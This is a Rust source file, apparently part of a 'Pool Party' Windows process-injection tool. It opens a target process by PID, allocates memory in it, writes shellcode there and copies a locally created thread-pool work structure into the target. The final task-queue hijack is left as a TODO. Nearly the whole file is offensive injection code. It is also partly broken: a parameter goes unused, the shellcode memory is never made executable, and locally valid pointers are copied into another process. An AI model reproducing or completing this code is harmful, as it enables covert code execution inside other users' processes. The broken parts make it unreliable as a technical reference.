// pool_party_std.rs - std wrapper for TP_WORK using Windows API
// This provides proper TP_WORK initialization using CreateThreadpoolWork

use std::ffi::c_void;

// Windows API types
type BOOL = i32;
type DWORD = u32;
type HANDLE = *mut c_void;
type PVOID = *mut c_void;

// Thread pool callback instance
#[repr(C)]
struct TP_CALLBACK_INSTANCE {
    _unused: [u8; 0],
}
type PTP_CALLBACK_INSTANCE = *mut TP_CALLBACK_INSTANCE;

// Thread pool work
#[repr(C)]
struct TP_WORK {
    _unused: [u8; 0],
}
type PTP_WORK = *mut TP_WORK;

// Work callback signature
type PTP_WORK_CALLBACK = unsafe extern "system" fn(
    Instance: PTP_CALLBACK_INSTANCE,
    Context: PVOID,
    Work: PTP_WORK,
);

// Thread pool callback environment
#[repr(C)]
struct TP_CALLBACK_ENVIRON_V3 {
    Version: u32,
    Pool: *mut c_void,
    CleanupGroup: *mut c_void,
    CleanupGroupCancelCallback: *mut c_void,
    RaceDll: *mut c_void,
    ActivationContext: *mut c_void,
    FinalizationCallback: *mut c_void,
    u: TP_CALLBACK_ENVIRON_V3_u,
    CallbackPriority: u32,
    Size: u32,
}

#[repr(C)]
union TP_CALLBACK_ENVIRON_V3_u {
    Flags: u32,
    s: TP_CALLBACK_ENVIRON_V3_s,
}

#[repr(C)]
struct TP_CALLBACK_ENVIRON_V3_s {
    _bitfield: u32,
}

type TP_CALLBACK_ENVIRON = TP_CALLBACK_ENVIRON_V3;
type PTP_CALLBACK_ENVIRON = *mut TP_CALLBACK_ENVIRON;

// Windows API imports
#[link(name = "kernel32")]
extern "system" {
    fn CreateThreadpoolWork(
        pfnwk: PTP_WORK_CALLBACK,
        pv: PVOID,
        pcbe: PTP_CALLBACK_ENVIRON,
    ) -> PTP_WORK;

    fn CloseThreadpoolWork(pwk: PTP_WORK);

    fn OpenProcess(
        dwDesiredAccess: DWORD,
        bInheritHandle: BOOL,
        dwProcessId: DWORD,
    ) -> HANDLE;

    fn CloseHandle(hObject: HANDLE) -> BOOL;

    fn WriteProcessMemory(
        hProcess: HANDLE,
        lpBaseAddress: PVOID,
        lpBuffer: *const c_void,
        nSize: usize,
        lpNumberOfBytesWritten: *mut usize,
    ) -> BOOL;

    fn VirtualAllocEx(
        hProcess: HANDLE,
        lpAddress: PVOID,
        dwSize: usize,
        flAllocationType: DWORD,
        flProtect: DWORD,
    ) -> PVOID;
}

// Constants
const PROCESS_VM_WRITE: DWORD = 0x0020;
const PROCESS_VM_READ: DWORD = 0x0010;
const PROCESS_VM_OPERATION: DWORD = 0x0008;
const PROCESS_DUP_HANDLE: DWORD = 0x0040;
const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;

const MEM_COMMIT: DWORD = 0x1000;
const MEM_RESERVE: DWORD = 0x2000;
const PAGE_READWRITE: DWORD = 0x04;

/// Create a properly initialized TP_WORK structure using Windows API
/// This returns the TP_WORK as a byte vector so it can be used with no_std code
pub fn create_tp_work_structure(shellcode_addr: usize) -> Vec<u8> {
    println!("[*] Creating TP_WORK using CreateThreadpoolWork API");

    // Create a dummy callback (we'll replace the function pointer later)
    unsafe extern "system" fn dummy_callback(
        _instance: PTP_CALLBACK_INSTANCE,
        _context: PVOID,
        _work: PTP_WORK,
    ) {
        // This will never be called - we replace the pointer
    }

    // Create TP_WORK using Windows API
    let tp_work = unsafe {
        CreateThreadpoolWork(
            dummy_callback,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    if tp_work.is_null() {
        eprintln!("[-] CreateThreadpoolWork failed");
        return Vec::new();
    }

    println!("[+] TP_WORK created at: {:p}", tp_work);
    println!("[+] Size of TP_WORK structure: {}", std::mem::size_of::<usize>() * 32); // Estimate

    // Read the TP_WORK structure as bytes
    // The actual structure is opaque, but we can read it as raw bytes
    let tp_work_bytes = unsafe {
        let ptr = tp_work as *const u8;
        let size = 256; // Read enough bytes to capture the full structure
        std::slice::from_raw_parts(ptr, size).to_vec()
    };

    // Don't close the work yet - we'll use it
    // unsafe { CloseThreadpoolWork(tp_work); }

    println!("[+] TP_WORK structure captured ({} bytes)", tp_work_bytes.len());
    tp_work_bytes
}

/// Helper to inject TP_WORK using Windows API + no_std syscalls
pub unsafe fn inject_tp_work_hybrid(
    target_pid: u32,
    shellcode: &[u8],
) -> Result<(), String> {
    println!("\n=== Hybrid TP_WORK Injection ===");
    println!("[*] Using CreateThreadpoolWork API for structure initialization");
    println!("[*] Target PID: {}", target_pid);

    // Step 1: Open target process
    let process_handle = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION |
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
        0,
        target_pid,
    );

    if process_handle.is_null() {
        return Err("Failed to open target process".to_string());
    }
    println!("[+] Process opened: {:p}", process_handle);

    // Step 2: Allocate memory for shellcode in target process
    let remote_shellcode = VirtualAllocEx(
        process_handle,
        std::ptr::null_mut(),
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE, // We'll change this later
    );

    if remote_shellcode.is_null() {
        CloseHandle(process_handle);
        return Err("Failed to allocate memory for shellcode".to_string());
    }
    println!("[+] Shellcode allocated at: {:p}", remote_shellcode);

    // Step 3: Write shellcode to target process
    let mut bytes_written = 0;
    let result = WriteProcessMemory(
        process_handle,
        remote_shellcode,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        &mut bytes_written,
    );

    if result == 0 {
        CloseHandle(process_handle);
        return Err("Failed to write shellcode".to_string());
    }
    println!("[+] Shellcode written ({} bytes)", bytes_written);

    // Step 4: Create TP_WORK structure using Windows API
    let tp_work_bytes = create_tp_work_structure(remote_shellcode as usize);
    if tp_work_bytes.is_empty() {
        CloseHandle(process_handle);
        return Err("Failed to create TP_WORK structure".to_string());
    }

    // Step 5: Allocate memory for TP_WORK in target process
    let remote_tp_work = VirtualAllocEx(
        process_handle,
        std::ptr::null_mut(),
        tp_work_bytes.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if remote_tp_work.is_null() {
        CloseHandle(process_handle);
        return Err("Failed to allocate memory for TP_WORK".to_string());
    }
    println!("[+] TP_WORK allocated at: {:p}", remote_tp_work);

    // Step 6: Write TP_WORK to target process
    let result = WriteProcessMemory(
        process_handle,
        remote_tp_work,
        tp_work_bytes.as_ptr() as *const c_void,
        tp_work_bytes.len(),
        &mut bytes_written,
    );

    if result == 0 {
        CloseHandle(process_handle);
        return Err("Failed to write TP_WORK".to_string());
    }
    println!("[+] TP_WORK written ({} bytes)", bytes_written);

    // TODO: Now use no_std pool_party code to:
    // 1. Get TP_POOL address via Worker Factory
    // 2. Modify TP_WORK to point to target's TP_POOL
    // 3. Insert into task queue

    println!("[+] TP_WORK structure created and written to target process");
    println!("[!] Next: Need to hijack task queue (continuing with no_std code)");

    CloseHandle(process_handle);
    Ok(())
}
